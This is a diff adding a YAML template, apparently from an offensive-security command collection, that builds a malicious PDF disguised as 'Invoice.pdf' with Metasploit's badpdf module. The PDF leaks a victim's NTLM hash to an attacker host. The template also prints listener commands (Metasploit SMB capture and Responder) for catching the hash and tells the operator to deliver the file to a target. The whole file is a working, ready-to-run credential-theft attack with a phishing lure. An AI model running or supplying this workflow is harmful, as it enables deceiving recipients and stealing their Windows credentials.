@@ -1,0 +1,23 @@
+---
+metadata:
+  filename: "deliver-windows-metasploit-badpdf-ntlm-leak-pdf.yaml"
+  tags: ["windows"]
+  created: "2026-06-14"
+  authors: ["s3mme"]
+
+content: |
+  printf '%s\n' 'badpdf creates a malicious PDF. Please wait...'; \
+  msfconsole -q -x "use auxiliary/fileformat/badpdf;set LHOST {{ attacker_ip }};set FILENAME Invoice.pdf;run;exit"; \
+  mkdir -p packstation/outbound; \
+  cp ~/.msf4/local/Invoice.pdf packstation/outbound/Invoice.pdf 2>/dev/null; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      ------Listener------                      '; \
+  printf '%s\n' 'Capture the leaked NTLM hash with ONE of the following:'; \
+  printf '%s\n' 'a) Metasploit SMB capture:'; \
+  printf '%s\n' '   msfconsole -q -x "use auxiliary/server/capture/smb;set SRVHOST {{ attacker_ip }};run -j;"'; \
+  printf '%s\n' 'b) Responder (LLMNR/NBT-NS/SMB poisoning, hashes in /usr/share/responder/logs):'; \
+  printf '%s\n' '   sudo responder -I tun0'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      ------Exploitation------                      '; \
+  printf '%s\n' 'Deliver Invoice.pdf to the target; opening it leaks the NTLM hash to {{ attacker_ip }}'; \
+  printf '%s\n' '================================================================';
